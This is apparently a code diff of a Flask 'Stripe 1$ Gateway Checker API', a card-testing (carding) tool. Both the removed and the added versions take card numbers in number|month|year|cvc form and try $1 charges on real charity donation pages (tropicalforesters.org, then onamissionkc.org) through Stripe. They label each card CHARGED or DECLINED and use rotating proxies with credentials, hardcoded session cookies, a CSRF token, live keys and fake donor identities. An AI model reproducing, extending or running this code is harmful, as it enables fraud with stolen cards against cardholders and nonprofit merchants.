@@ -1,409 +1,335 @@
-from datetime import datetime
+from flask import Flask, jsonify
 import requests
-import random
-import string
-from flask import Flask, request, jsonify
-from colorama import Fore, Style
-import json
-import os
-from dotenv import load_dotenv
-import logging
 import re
-from bs4 import BeautifulSoup
-
-# Load environment variables
-load_dotenv()
-
-# Set up logging
-logging.basicConfig(level=logging.INFO)
-logger = logging.getLogger(__name__)
 
 app = Flask(__name__)
 
-# Configuration
-DEBUG = os.getenv('DEBUG', 'True').lower() == 'true'
-HOST = os.getenv('HOST', '0.0.0.0')
-PORT = int(os.getenv('PORT', 5000))
-
-PROXIES = [
-    "142.111.48.253:7030:fqcqdvlf:k7rypvhmn940",
-    "31.59.20.176:6754:fqcqdvlf:k7rypvhmn940",
-    "23.95.150.145:6114:fqcqdvlf:k7rypvhmn940",
-    "198.23.239.134:6540:fqcqdvlf:k7rypvhmn940",
-    "45.38.107.97:6014:fqcqdvlf:k7rypvhmn940",
-    "107.172.163.27:6543:fqcqdvlf:k7rypvhmn940",
-    "64.137.96.74:6641:fqcqdvlf:k7rypvhmn940",
-    "216.10.27.159:6837:fqcqdvlf:k7rypvhmn940",
-    "142.111.67.146:5611:fqcqdvlf:k7rypvhmn940",
-    "142.147.128.93:6593:fqcqdvlf:k7rypvhmn940"
-]
-
-def generate_random_email():
-    name = ''.join(random.choices(string.ascii_lowercase, k=10))
-    number = ''.join(random.choices(string.digits, k=4))
-    return f"{name}{number}@gmail.com"
-
-def extract_payment_intent_id(client_secret):
-    if client_secret and client_secret.startswith('pi_'):
-        parts = client_secret.split('_secret_')
-        if len(parts) > 0:
-            return parts[0]
-    return None
-
-def get_random_proxy():
-    proxy_line = random.choice(PROXIES)
-    parts = proxy_line.split(':')
-    if len(parts) == 4:
-        ip, port, username, password = parts
-        proxy_url = f"http://{username}:{password}@{ip}:{port}"
-        return {
-            'http': proxy_url,
-            'https': proxy_url
-        }
-    return None
-
-def validate_card(n, mm, yy, cvc):
-    if not (n.isdigit() and mm.isdigit() and yy.isdigit() and cvc.isdigit()):
-        return False, "Invalid CC data - all fields must be numbers"
-    
-    if len(n) < 13 or len(n) > 19:
-        return False, "Invalid card number length"
-    
-    if not (1 <= int(mm) <= 12):
-        return False, "Invalid month (must be 01-12)"
-    
-    if len(cvc) < 3:
-        return False, "Invalid CVC"
-    
-    # Format date
-    if len(mm) == 1:
-        mm = f'0{mm}'
-    if len(yy) == 4:
-        yy = yy[2:]
-    
-    try:
-        exp_date = datetime.strptime(f"{mm}/20{yy}", "%m/%Y")
-        if exp_date < datetime.now():
-            return False, "Card is expired"
-    except ValueError:
-        return False, "Invalid expiration date"
-    
-    return True, ""
-
-def extract_client_secret_from_html(html_content):
-    """Extract client secret from HTML response"""
-    try:
-        # Try to find client secret in JavaScript variables
-        # Look for patterns like: clientSecret: "pi_xxx_secret_xxx"
-        secret_pattern = r'clientSecret["\']?\s*[:=]\s*["\']([^"\']+)["\']'
-        matches = re.findall(secret_pattern, html_content)
-        
-        if matches:
-            for match in matches:
-                if match.startswith('pi_'):
-                    logger.info(f"Found client secret in HTML: {match[:20]}...")
-                    return match
-        
-        # Try to find in JSON data embedded in HTML
-        json_pattern = r'givewpStripePaymentElementData["\']?\s*[:=]\s*({[^}]+})'
-        json_matches = re.findall(json_pattern, html_content)
-        
-        for json_match in json_matches:
-            try:
-                data = json.loads(json_match)
-                if 'clientSecret' in data:
-                    return data['clientSecret']
-            except:
-                pass
-        
-        # Try to find in script tags
-        soup = BeautifulSoup(html_content, 'html.parser')
-        scripts = soup.find_all('script')
-        
-        for script in scripts:
-            if script.string:
-                script_content = script.string
-                secret_matches = re.findall(r'pi_[^"\']*_secret_[^"\']*', script_content)
-                if secret_matches:
-                    return secret_matches[0]
-        
-        return None
-    except Exception as e:
-        logger.error(f"Error extracting client secret from HTML: {e}")
-        return None
-
-def check_card(cc):
-    parts = cc.split('|')
-    if len(parts) != 4:
-        return {"status": "ERROR", "message": "Invalid CC format. Use: number|mm|yy|cvc"}
-    
-    n, mm, yy, cvc = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
-    
-    # Validate card details
-    is_valid, error_message = validate_card(n, mm, yy, cvc)
-    if not is_valid:
-        return {"status": "ERROR", "message": error_message}
-    
-    # Generate random data
-    email = generate_random_email()
-    first_name = "John"
-    last_name = "Smith"
-    proxy = get_random_proxy()
-    
-    url1 = 'https://tropicalforesters.org/?givewp-route=donate&givewp-route-signature=704f09ba077bd1e770aba4339aa86bb6&givewp-route-signature-id=givewp-donate&givewp-route-signature-expiration=1762667766'
-    
-    headers1 = {
-        'Accept-Language': 'en-GB',
-        'Connection': 'keep-alive',
-        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryeW6D2gF0agBk9uo6',
-        'Cookie': 'pll_language=en; PHPSESSID=37auq55edvs8fqc47diomfnmbc; __stripe_mid=db7acc47-ef80-4aa1-b64d-502f22192ca8e7a2f2; __stripe_sid=b2a42d13-da1b-4597-8224-148a79efe023b8ca25',
-        'Origin': 'https://tropicalforesters.org',
-        'Referer': 'https://tropicalforesters.org/?givewp-route=donation-form-view&form-id=1656&locale=en_US',
-        'Sec-Fetch-Dest': 'empty',
-        'Sec-Fetch-Mode': 'cors',
-        'Sec-Fetch-Site': 'same-origin',
-        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
+# Fetch a new cart token
+def fetch_cart_token():
+    cart_headers = {
+        'authority': 'www.onamissionkc.org',
         'accept': 'application/json',
-        'save-data': 'on',
-        'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99", "Microsoft Edge Simulate";v="127", "Lemur";v="127"',
+        'accept-encoding': 'gzip, deflate, br, zstd',
+        'accept-language': 'en-US,en;q=0.9',
+        'content-type': 'application/json',
+        'origin': 'https://www.onamissionkc.org',
+        'referer': 'https://www.onamissionkc.org/donate-now',
+        'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
         'sec-ch-ua-mobile': '?1',
-        'sec-ch-ua-platform': '"Android"'
+        'sec-ch-ua-model': '"Nexus 5"',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
     }
 
-    boundary = "----WebKitFormBoundaryeW6D2gF0agBk9uo6"
-    
-    form_data = f"""--{boundary}
-Content-Disposition: form-data; name="amount"
-
-1
---{boundary}
-Content-Disposition: form-data; name="currency"
-
-USD
---{boundary}
-Content-Disposition: form-data; name="donationType"
-
-single
---{boundary}
-Content-Disposition: form-data; name="formId"
-
-1656
---{boundary}
-Content-Disposition: form-data; name="gatewayId"
-
-stripe_payment_element
---{boundary}
-Content-Disposition: form-data; name="firstName"
-
-{first_name}
---{boundary}
-Content-Disposition: form-data; name="lastName"
-
-{last_name}
---{boundary}
-Content-Disposition: form-data; name="email"
-
-{email}
---{boundary}
-Content-Disposition: form-data; name="countryofresidence"
-
-US
---{boundary}
-Content-Disposition: form-data; name="comment"
-
-Hello sir
---{boundary}
-Content-Disposition: form-data; name="anonymous"
-
-true
---{boundary}
-Content-Disposition: form-data; name="donationBirthday"
-
-
---{boundary}
-Content-Disposition: form-data; name="originUrl"
-
-https://tropicalforesters.org/donations/donate/
---{boundary}
-Content-Disposition: form-data; name="isEmbed"
-
-true
---{boundary}
-Content-Disposition: form-data; name="embedId"
-
-1656
---{boundary}
-Content-Disposition: form-data; name="locale"
-
-en_US
---{boundary}
-Content-Disposition: form-data; name="gatewayData[stripePaymentMethod]"
-
-card
---{boundary}
-Content-Disposition: form-data; name="gatewayData[stripePaymentMethodIsCreditCard]"
-
-true
---{boundary}
-Content-Disposition: form-data; name="gatewayData[formId]"
-
-1656
---{boundary}
-Content-Disposition: form-data; name="gatewayData[stripeKey]"
-
-pk_live_51OIXF8CiL0tzws6ZSoVB1xTLKPuWmkV27iBmwMqhq3oVcXbP7Rvelx5xJzfLnwg1dOhlnV4BDkflWJ0LqtH0lWHL00c7elSpy9
---{boundary}
-Content-Disposition: form-data; name="gatewayData[stripeConnectedAccountId]"
-
-acct_1OIXF8CiL0tzws6Z
---{boundary}--
-"""
+    cart_data = {
+        'amount': {
+            'value': 100,
+            'currencyCode': 'USD',
+        },
+        'donationFrequency': 'ONE_TIME',
+        'feeAmount': None,
+    }
 
     try:
-        logger.info(f"Making first request to {url1}")
-        resp1 = requests.post(url1, headers=headers1, data=form_data, timeout=30, proxies=proxy)
+        response = requests.post(
+            'https://www.onamissionkc.org/api/v1/fund-service/websites/62fc11be71fa7a1da8ed62f8/donations/funds/6acfdbc6-2deb-42a5-bdf2-390f9ac5bc7b',
+            headers=cart_headers,
+            json=cart_data,
+            timeout=30
+        )
         
-        logger.info(f"First response status: {resp1.status_code}")
-        logger.info(f"First response headers: {resp1.headers}")
-        logger.info(f"First response content type: {resp1.headers.get('content-type', 'unknown')}")
+        if response.status_code != 200 or 'redirectUrlPath' not in response.json():
+            error_msg = response.json().get('error', {}).get('message', 'Failed to create new cart')
+            return {'success': False, 'message': error_msg}
         
-        if resp1.status_code != 200:
-            logger.error(f"First request failed with status {resp1.status_code}")
-            logger.error(f"Response content: {resp1.text[:500]}")
-            return {"status": "ERROR", "message": f"First request failed: {resp1.status_code}"}
+        # Extract cart token from redirect URL
+        redirect_url = response.json()['redirectUrlPath']
+        match = re.search(r'cartToken=([^&]+)', redirect_url)
+        if not match:
+            return {'success': False, 'message': 'Unable to extract cart token'}
         
-        # Check content type and parse accordingly
-        content_type = resp1.headers.get('content-type', '').lower()
-        client_secret = None
-        
-        if 'application/json' in content_type:
-            try:
-                response_data = resp1.json()
-                logger.info(f"Successfully parsed JSON response")
-                client_secret = response_data.get('data', {}).get('clientSecret')
-            except json.JSONDecodeError as e:
-                logger.error(f"JSON decode error: {e}")
-                logger.error(f"Response content: {resp1.text[:500]}")
-                return {"status": "ERROR", "message": f"Failed to parse JSON response: {str(e)}"}
-        else:
-            # Handle HTML response
-            logger.info("Received HTML response, attempting to extract client secret")
-            client_secret = extract_client_secret_from_html(resp1.text)
-            
-            if not client_secret:
-                logger.error("Could not extract client secret from HTML")
-                logger.error(f"HTML content: {resp1.text[:1000]}")
-                return {"status": "ERROR", "message": "Could not extract client secret from HTML response"}
-        
-        if not client_secret:
-            logger.error("No client secret found in response")
-            return {"status": "ERROR", "message": "Could not extract client secret"}
-        
-        payment_intent_id = extract_payment_intent_id(client_secret)
-        
-        if not payment_intent_id:
-            logger.error(f"Could not extract payment intent ID from: {client_secret}")
-            return {"status": "ERROR", "message": "Could not extract payment intent ID"}
-        
-        url2 = f'https://api.stripe.com/v1/payment_intents/{payment_intent_id}/confirm'
-        
-        headers2 = {
-            'accept': 'application/json',
-            'accept-language': 'en-GB',
-            'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://js.stripe.com',
-            'priority': 'u=1, i',
-            'referer': 'https://js.stripe.com/',
-            'save-data': 'on',
-            'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99", "Microsoft Edge Simulate";v="127", "Lemur";v="127"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-site',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36'
-        }
-
-        form_data2 = {
-            'return_url': 'https://tropicalforesters.org/donations/donate/?givewp-event=donation-completed&givewp-listener=show-donation-confirmation-receipt&givewp-receipt-id=e9e2760ed96cff94c8a86fef8a89dcdf&givewp-embed-id=1656',
-            'payment_method_data[billing_details][name]': f'{first_name} {last_name}',
-            'payment_method_data[billing_details][email]': email,
-            'payment_method_data[billing_details][address][country]': 'US',
-            'payment_method_data[type]': 'card',
-            'payment_method_data[card][number]': n,
-            'payment_method_data[card][cvc]': cvc,
-            'payment_method_data[card][exp_year]': f'20{yy}',
-            'payment_method_data[card][exp_month]': mm,
-            'payment_method_data[allow_redisplay]': 'unspecified',
-            'payment_method_data[payment_user_agent]': 'stripe.js/0eddba596b; stripe-js-v3/0eddba596b; payment-element; deferred-intent; autopm',
-            'payment_method_data[referrer]': 'https://tropicalforesters.org',
-            'payment_method_data[time_on_page]': '83948',
-            'payment_method_data[guid]': '6fdc8b02-04aa-4f03-9deb-364c7a317927f631e2',
-            'payment_method_data[muid]': 'db7acc47-ef80-4aa1-b64d-502f22192ca8e7a2f2',
-            'payment_method_data[sid]': 'b2a42d13-da1b-4597-8224-148a79efe023b8ca25',
-            'expected_payment_method_type': 'card',
-            'client_context[currency]': 'usd',
-            'client_context[mode]': 'payment',
-            'use_stripe_sdk': 'true',
-            'key': 'pk_live_51OIXF8CiL0tzws6ZSoVB1xTLKPuWmkV27iBmwMqhq3oVcXbP7Rvelx5xJzfLnwg1dOhlnV4BDkflWJ0LqtH0lWHL00c7elSpy9',
-            '_stripe_account': 'acct_1OIXF8CiL0tzws6Z',
-            'client_secret': client_secret
-        }
-
-        logger.info(f"Making second request to {url2}")
-        resp2 = requests.post(url2, headers=headers2, data=form_data2, timeout=30, proxies=proxy)
-        
-        card_info = f"{n}|{mm}|{yy}|{cvc}"
-        
-        if resp2.status_code == 200:
-            response_data = resp2.json()
-            status = response_data.get('status', '')
-            
-            if status == 'succeeded':
-                charge_id = response_data.get('charges', {}).get('data', [{}])[0].get('id', 'N/A')
-                return {"status": "CHARGED", "message": f"Charge ID: {charge_id} | Payment Succeeded", "card": card_info}
-            elif status == 'requires_action':
-                return {"status": "3DS", "message": "3D Secure Required", "card": card_info}
-            else:
-                return {"status": "UNKNOWN", "message": f"Status: {status}", "card": card_info}
-                
-        else:
-            try:
-                error_data = resp2.json()
-                error = error_data.get('error', {})
-                
-                charge_id = error.get('charge', 'N/A')
-                code = error.get('code', 'N/A')
-                decline_code = error.get('decline_code', 'N/A')
-                message = error.get('message', 'Unknown error')
-                
-                return {"status": "DECLINED", "message": f"Charge ID: {charge_id} | Response: {code} [{decline_code}] ! {message}", "card": card_info}
-            except:
-                return {"status": "ERROR", "message": f"HTTP {resp2.status_code}: {resp2.text}", "card": card_info}
-
-    except requests.exceptions.RequestException as e:
-        logger.error(f"Request exception: {e}")
-        return {"status": "ERROR", "message": f"Connection failed: {e}"}
+        return {'success': True, 'cartToken': match.group(1)}
     except Exception as e:
-        logger.error(f"General exception: {e}")
-        return {"status": "ERROR", "message": f"An error occurred: {e}"}
+        return {'success': False, 'message': str(e)}
 
-@app.route('/gate=stripe1$/cc=<path:cc>')
-def stripe_check(cc):
-    if not cc:
-        return jsonify({"status": "ERROR", "message": "Missing cc parameter"})
+# Create payment method with Stripe API
+def create_payment_method(card_number, exp_month, exp_year, cvc):
+    headers = {
+        'authority': 'api.stripe.com',
+        'accept': 'application/json',
+        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+        'content-type': 'application/x-www-form-urlencoded',
+        'origin': 'https://js.stripe.com',
+        'referer': 'https://js.stripe.com/',
+        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-site',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+    }
+
+    data = {
+        'billing_details[address][city]': 'Oakford',
+        'billing_details[address][country]': 'US',
+        'billing_details[address][line1]': 'Siles Avenue',
+        'billing_details[address][line2]': '',
+        'billing_details[address][postal_code]': '19053',
+        'billing_details[address][state]': 'PA',
+        'billing_details[name]': 'Geroge Washintonne',
+        'billing_details[email]': 'grogeh@gmail.com',
+        'type': 'card',
+        'card[number]': card_number,
+        'card[cvc]': cvc,
+        'card[exp_year]': exp_year,
+        'card[exp_month]': exp_month,
+        'allow_redisplay': 'unspecified',
+        'payment_user_agent': 'stripe.js/5445b56991; stripe-js-v3/5445b56991; payment-element; deferred-intent',
+        'referrer': 'https://www.onamissionkc.org',
+        'time_on_page': '145592',
+        'client_attribution_metadata[client_session_id]': '22e7d0ec-db3e-4724-98d2-a1985fc4472a',
+        'client_attribution_metadata[merchant_integration_source]': 'elements',
+        'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
+        'client_attribution_metadata[merchant_integration_version]': '2021',
+        'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
+        'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
+        'client_attribution_metadata[elements_session_config_id]': '7904f40e-9588-48b2-bc6b-fb88e0ef71d5',
+        'guid': '18f2ab46-3a90-48da-9a6e-2db7d67a3b1de3eadd',
+        'muid': '3c19adce-ab63-41bc-a086-f6840cd1cb6d361f48',
+        'sid': '9d45db81-2d1e-436a-b832-acc8b6abac4814eb67',
+        'key': 'pk_live_51LwocDFHMGxIu0Ep6mkR59xgelMzyuFAnVQNjVXgygtn8KWHs9afEIcCogfam0Pq6S5ADG2iLaXb1L69MINGdzuO00gFUK9D0e',
+        '_stripe_account': 'acct_1LwocDFHMGxIu0Ep',
+    }
+
+    try:
+        response = requests.post(
+            'https://api.stripe.com/v1/payment_methods',
+            headers=headers,
+            data=data,
+            timeout=30
+        )
+        
+        if response.status_code != 200:
+            error_msg = response.json().get('error', {}).get('message', 'Unknown error')
+            return {'success': False, 'message': error_msg, 'payment_method_id': None}
+        
+        result = response.json()
+        if 'id' not in result:
+            return {'success': False, 'message': 'Invalid response from Stripe', 'payment_method_id': None}
+        
+        return {'success': True, 'payment_method_id': result['id']}
+    except Exception as e:
+        return {'success': False, 'message': str(e), 'payment_method_id': None}
+
+# Process payment with merchant API
+def process_payment(cart_token, payment_method_id):
+    cookies = 'crumb=BZuPjds1rcltODIxYmZiMzc3OGI0YjkyMDM0YzZhM2RlNDI1MWE1; ' \
+              'ss_cvr=b5544939-8b08-4377-bd39-dfc7822c1376|1760724937850|1760724937850|1760724937850|1; ' \
+              'ss_cvt=1760724937850; ' \
+              '__stripe_mid=3c19adce-ab63-41bc-a086-f6840cd1cb6d361f48; ' \
+              '__stripe_sid=9d45db81-2d1e-436a-b832-acc8b6abac4814eb67'
+
+    headers = {
+        'authority': 'www.onamissionkc.org',
+        'accept': 'application/json, text/plain, */*',
+        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+        'content-type': 'application/json',
+        'origin': 'https://www.onamissionkc.org',
+        'referer': f'https://www.onamissionkc.org/checkout?cartToken={cart_token}',
+        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+        'x-csrf-token': 'BZuPjds1rcltODIxYmZiMzc3OGI0YjkyMDM0YzZhM2RlNDI1MWE1',
+    }
+
+    json_data = {
+        'email': 'grogeh@gmail.com',
+        'subscribeToList': False,
+        'shippingAddress': {
+            'id': '',
+            'firstName': '',
+            'lastName': '',
+            'line1': '',
+            'line2': '',
+            'city': '',
+            'region': 'NY',
+            'postalCode': '',
+            'country': '',
+            'phoneNumber': '',
+        },
+        'createNewUser': False,
+        'newUserPassword': None,
+        'saveShippingAddress': False,
+        'makeDefaultShippingAddress': False,
+        'customFormData': None,
+        'shippingAddressId': None,
+        'proposedAmountDue': {
+            'decimalValue': '1',
+            'currencyCode': 'USD',
+        },
+        'cartToken': cart_token,
+        'paymentToken': {
+            'stripePaymentTokenType': 'PAYMENT_METHOD_ID',
+            'token': payment_method_id,
+            'type': 'STRIPE',
+        },
+        'billToShippingAddress': False,
+        'billingAddress': {
+            'id': '',
+            'firstName': 'Davide',
+            'lastName': 'Washintonne',
+            'line1': 'Siles Avenue',
+            'line2': '',
+            'city': 'Oakford',
+            'region': 'PA',
+            'postalCode': '19053',
+            'country': 'US',
+            'phoneNumber': '+1361643646',
+        },
+        'savePaymentInfo': False,
+        'makeDefaultPayment': False,
+        'paymentCardId': None,
+        'universalPaymentElementEnabled': True,
+    }
+
+    try:
+        response = requests.post(
+            'https://www.onamissionkc.org/api/2/commerce/orders',
+            headers=headers,
+            json=json_data,
+            cookies={'cookie': cookies},
+            timeout=30
+        )
+        
+        if response.status_code != 200:
+            return {'success': False, 'message': f'HTTP error: {response.status_code}'}
+        
+        result = response.json()
+        if 'failureType' in result:
+            return {'success': False, 'message': result['failureType']}
+        
+        return {'success': True, 'message': 'CHARGED'}
+    except Exception as e:
+        return {'success': False, 'message': str(e)}
+
+@app.route('/gate=stripe1$/cc=<card_info>')
+def check_card(card_info):
+    # Parse card information from pipe format
+    try:
+        card_parts = card_info.split('|')
+        if len(card_parts) < 4:
+            return jsonify({
+                'status': 'ERROR',
+                'message': 'Invalid card format. Expected: number|month|year|cvc'
+            })
+        
+        card_number = card_parts[0]
+        exp_month = card_parts[1]
+        exp_year = card_parts[2]
+        cvc = card_parts[3]
+        
+        # Format year to 4 digits if needed
+        if len(exp_year) == 2:
+            exp_year = '20' + exp_year
+            
+    except Exception as e:
+        return jsonify({
+            'status': 'ERROR',
+            'message': f'Error parsing card information: {str(e)}'
+        })
     
-    result = check_card(cc)
-    return jsonify(result)
+    # Validate card details
+    if not all([card_number, exp_month, exp_year, cvc]):
+        return jsonify({
+            'status': 'DECLINED',
+            'message': 'Missing card details',
+            'response': 'MISSING_CARD_DETAILS'
+        })
+    
+    # Step 1: Create payment method with Stripe
+    stripe_result = create_payment_method(card_number, exp_month, exp_year, cvc)
+    if not stripe_result['success']:
+        return jsonify({
+            'status': 'DECLINED',
+            'message': 'Your card was declined',
+            'response': stripe_result['message'],
+            'payment_method_id': stripe_result['payment_method_id']
+        })
+    
+    payment_method_id = stripe_result['payment_method_id']
+    
+    # Step 2: Get cart token
+    cart_result = fetch_cart_token()
+    if not cart_result['success']:
+        return jsonify({
+            'status': 'ERROR',
+            'message': 'Unable to create new cart',
+            'response': cart_result['message'],
+            'payment_method_id': payment_method_id
+        })
+    
+    cart_token = cart_result['cartToken']
+    
+    # Step 3: Process payment with retry logic
+    max_retries = 3
+    retry_count = 0
+    
+    while retry_count < max_retries:
+        payment_result = process_payment(cart_token, payment_method_id)
+        
+        if payment_result['success']:
+            # Success
+            return jsonify({
+                'status': 'CHARGED',
+                'message': 'Your card has been charged $1.00 successfully.',
+                'response': 'CHARGED',
+                'payment_method_id': payment_method_id
+            })
+        
+        # Handle specific errors that require a new cart token
+        if payment_result['message'] in ['CART_ALREADY_PURCHASED', 'CART_MISSING', 'STALE_USER_SESSION']:
+            cart_result = fetch_cart_token()
+            if not cart_result['success']:
+                return jsonify({
+                    'status': 'ERROR',
+                    'message': 'Unable to create new cart',
+                    'response': cart_result['message'],
+                    'payment_method_id': payment_method_id
+                })
+            cart_token = cart_result['cartToken']
+            retry_count += 1
+            continue
+        
+        # Other failures
+        return jsonify({
+            'status': 'DECLINED',
+            'message': 'Your card was declined',
+            'response': f"PAYMENT_DECLINED [{payment_result['message']}]",
+            'payment_method_id': payment_method_id
+        })
+    
+    # Max retries reached
+    return jsonify({
+        'status': 'ERROR',
+        'message': 'Unable to process payment due to persistent errors',
+        'response': f"MAX_RETRIES_EXCEEDED {card_number}|{exp_month}|{exp_year}|{cvc}",
+        'payment_method_id': payment_method_id
+    })
 
 @app.route('/')
 def index():
     return jsonify({
-        "service": "Stripe Card Checker API",
-        "version": "1.0",
-        "endpoint": "/gate=stripe1$/cc=<card_details>",
-        "format": "number|mm|yy|cvc"
+        'message': 'Stripe 1$ Gateway Checker API',
+        'usage': '/gate=stripe1$/cc={card_number}|{exp_month}|{exp_year}|{cvc}'
     })
 
-if __name__ == "__main__":
-    app.run(debug=DEBUG, host=HOST, port=PORT)
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000, debug=True)
